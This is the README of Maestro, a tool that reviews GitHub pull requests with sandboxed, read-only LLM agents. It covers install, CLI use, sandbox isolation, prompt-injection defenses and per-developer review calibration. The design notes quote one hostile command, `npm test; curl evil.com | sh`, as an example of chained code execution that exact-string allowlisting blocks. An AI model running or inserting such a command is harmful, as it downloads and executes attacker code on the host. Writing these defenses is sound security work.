# Maestro

Maestro reviews pull requests with a crew of specialist agents rather than one generalist. It
watches GitHub, builds an isolated environment for each pull request, runs the agents in
parallel, and merges what they find into a single review comment.

The pipeline is not hardcoded. It is a versioned **playbook**: a graph, a set of agents with
editable personas and per-agent model bindings, router rules, and an environment spec, stored in
the database and editable in the browser. The engine interprets that graph, so adding a reviewer
or pointing one at a different model is a configuration change, not a code change.

It can also review the way a particular developer reviews. Answer a calibration battery once, and
the same findings are gated and worded as that person would gate and word them — see
[Reviewing as a developer](#reviewing-as-a-developer).

## Install

```sh
curl -fsSL https://raw.githubusercontent.com/mustafarslan/maestro/master/install.sh | sh
maestro init
maestro doctor
```

Two things `init` cannot install for you, and a review produces nothing without both:

- **Docker.** Every review runs in a container. `doctor` checks for it.
- **A model provider.** Either set `ANTHROPIC_API_KEY` — the default playbook binds its agents to
  Claude — or run `ollama signin`, since the declared fallback is `glm-5.3:cloud` on Ollama
  Cloud. That is a hosted account of its own, not local inference; nothing runs a model on your
  machine unless you bind one yourself.

The shortest path to a first review needs no GitHub App, no token, and no pull request:

```sh
maestro review ~/code/my-app --base HEAD~1
```

## Use it

```sh
# Review a pull request, or a local checkout
maestro review https://github.com/owner/repo/pull/412

# Run the daemon: webhooks or polling, workers, and the admin UI
maestro serve --poll owner/repo --admin-port 7777
maestro serve --webhook-port 8080 --webhook-secret "$SECRET"

# Expose Maestro to Claude Code
claude mcp add maestro -- maestro mcp

# Inspect and configure
maestro llm providers | models | test
maestro playbook export pb.yaml && maestro playbook import pb.yaml --activate
maestro eval add my-case ./repo && maestro eval run && maestro eval report

# Review as a particular developer: answer the calibration battery once, then activate it
maestro profile take --subject octocat && maestro profile activate --subject octocat
maestro profile show --subject octocat      # the scored profile, and how much of it is observed
maestro profile review-first                # items the battery's authors shipped on judgement
```

`maestro serve` prints a URL with a token. That opens the admin UI: a live review board, a span
waterfall per review, the Playbook Studio, and provider spend.

## How it works

```
webhook / poll → Review(repo, pr, head_sha, playbook_version)
   │
   ├─ prepare-env   clone at head, detect toolchain, install deps, snapshot the image
   ├─ router        which agents apply, and at what budget
   │
   ├─ agent:product      ─┐
   ├─ agent:security      │ in parallel, each in its OWN container off that one snapshot
   ├─ agent:architecture  │
   ├─ agent:ui-ux        ─┘
   │
   ├─ triage        dedupe, cross-agent agreement, calibrate, rank, threshold
   ├─ post          ONE consolidated comment, and what was actually checked
   └─ [finalizer]   destroy containers, volumes and snapshots — always
```

## Design notes

**Two sandbox postures, asserted rather than assumed.** `analyze` runs with `--network none`, a
read-only root filesystem, every capability dropped, no secrets and no Docker socket. `prepare`
is the only phase with a network, and it runs on a per-review internal Docker network whose only
route out is an allowlist proxy — no default route, no external DNS, so the allowlist is a
control rather than a request. It installs dependencies, so it cannot be read-only or non-root,
but it keeps only the six capabilities a package manager needs to own the files it writes.
`packages/sandbox/src/docker.integration.test.ts` checks each of these against real containers,
because a typo in a `docker run` flag is otherwise silent.

**Agents cannot act.** They get read-only tools, no network and no GitHub credential.
`run_command` matches its allowlist by exact string, never by prefix, so `npm test; curl evil.com
| sh` cannot pass as `npm test`. Only the orchestrator posts. That is what makes it safe to show
a model attacker-controlled pull request text at all — see `packages/agents/src/injection.test.ts`.

**Prompt layering.** Every system prompt is a fixed preamble, then the editable persona, then a
fixed output contract. The wrapper lives in code, so no persona edit — including one made in the
Studio — can remove the injection defenses.

**The product agent reads the ticket, not just the description.** With `LINEAR_API_KEY` set,
Maestro resolves the issue from the branch name, body or title and passes its acceptance criteria
to that agent. The description is the author's account of what they built; the ticket is the
independent record of what was asked for. Linear is never an agent tool: the orchestrator
fetches, the agent reads text. Every failure degrades to a review without ticket context rather
than a failed review.

**Agents are scheduled across reviews, not within one.** A worker pool admits agent tasks under
global, per-agent, per-repo and per-provider limits, rotating across reviews rather than running
first-in-first-out. A 40-file pull request cannot starve a 2-file one that arrived later.

**Maestro owns the agent loop.** The Vercel AI SDK normalises individual provider calls; its
retry and multi-step helpers are switched off. Owning the loop is what makes per-agent budgets,
honest token accounting and the terminal-tool contract possible.

**The comment reports what was checked, never how accurate it was.** Precision and recall need
human feedback that does not exist when the comment is written. They are gathered afterwards from
reactions and later edits, and shown in the UI.

## Reviewing as a developer

Two reviewers looking at the same diff disagree about what is worth blocking for, and both are
right for their own codebase. Maestro can hold one of those positions on purpose rather than
averaging them away.

A developer answers a calibration battery once: 100 items, each a real diff with four defensible
responses and no correct answer. Scoring turns that into how they gate — the severity at which
they block, how much weight they give a concurrency bug against a naming nit, how they treat a
shortcut with a ticket attached, and how they phrase a request. Nothing about the diagnosis
changes: the specialist agents review exactly as they always do, with no profile in their
prompts, because a finding that changed with the reader would not be a finding. The profile acts
afterwards, on what to do about each one.

It applies in two layers. A deterministic pass scales each finding's severity by that developer's
weight for its topic and decides whether it blocks, comments, or drops. Then the triage agent
writes the final review as that person, and the pull request gets the review state they would
have chosen. Two invariants live in code where no profile, persona or model can reach them:
anything at σ ≥ 0.80 blocks regardless, and anything below σ 0.30 never blocks. If the agent
answers outside its contract, the deterministic result stands and the comment says so.

The battery is a synthetic instrument, not a validated psychometric one, and some items shipped
on their authors' judgement rather than a clean audit. `maestro profile review-first` lists
exactly which, so an admin can read them before trusting a profile that leans on them. Profiles
are stored per battery version: a new version is answered again rather than silently
reinterpreted. And a profile is behavioural data about a person — locally it is one profile per
person, while `maestro serve` applies one active profile to every review, which is worth saying
out loud to a team before turning it on. [Configuration](docs/CONFIGURATION.md) has the details.

## Layout

| Package | Purpose |
| --- | --- |
| `packages/core` | store, portable SQLite driver, migrations, job queue, spans, incremental planning |
| `packages/playbook` | schema, graph validation, node registry, prompt layering, versioned store |
| `packages/llm` | provider adapters, agent loop, budgets, pricing, conformance suite |
| `packages/sandbox` | Docker driver, two-phase isolation, egress proxy, toolchain detection, cache, reaper |
| `packages/agents` | read-only tool surface, Finding schema, agent runner |
| `packages/engine` | graph interpreter, router, triage, rendering, persistence, eval scoring |
| `packages/profile` | calibration battery and developer-profile scoring |
| `packages/integrations` | GitHub App and PAT, webhooks, poller, review posting, feedback ingestion |
| `packages/server` | daemon, scheduler, admin API, SSE, embedded UI |
| `packages/mcp` | stdio MCP server |
| `packages/ui` | React and React Flow admin SPA |
| `apps/cli` | the `maestro` binary |

## Triggering a review

Automatically on `opened`, `reopened`, `ready_for_review` and `synchronize` — or on demand by
commenting on the pull request:

```
@maestro review
```

`/maestro review` works too, and trailing words are ignored.

Only people GitHub reports as `OWNER`, `MEMBER` or `COLLABORATOR` may ask, because a review starts
containers and spends money, and on a public repository a comment is anyone's to write. To review
only when asked, set `router.automaticTriggers: false` in the playbook, or turn off "Review every
pull request automatically" in the Studio.

## Develop

Requires Node 22.14 or newer, pnpm, Docker, and [Bun](https://bun.sh) for the binary build.

```sh
pnpm install
pnpm typecheck
pnpm test              # includes real-Docker integration tests
pnpm run build:binary  # -> dist/maestro
```

## Deploying

`maestro serve` on a host is the supported deployment: one binary, and the installer above is the
whole setup.

`docker-compose.yml` is included and a full review has been driven through it against a host
Ollama. One caveat remains: Maestro is a container there while its sandboxes are siblings on the
host daemon, so the egress proxy binds a fixed published port (`MAESTRO_PROXY_PORT_RANGE`) for
them to reach it. That path has not been exercised on a Linux host.

## Reference

- [Configuration](docs/CONFIGURATION.md) — credentials, state, sandbox networking, self-hosting
- [Status](docs/STATUS.md) — what is verified against reality, and what is not
- [TODO](docs/TODO.md) — what is deliberately not built yet, and why
- [Security](SECURITY.md) — reporting a vulnerability, and what is in scope

## Status

All ten phases of the implementation plan are landed. `docs/STATUS.md` keeps "built" and
"verified" in separate columns, and the gap between them is the honest summary of where the
project stands.

## License

[MIT](LICENSE).
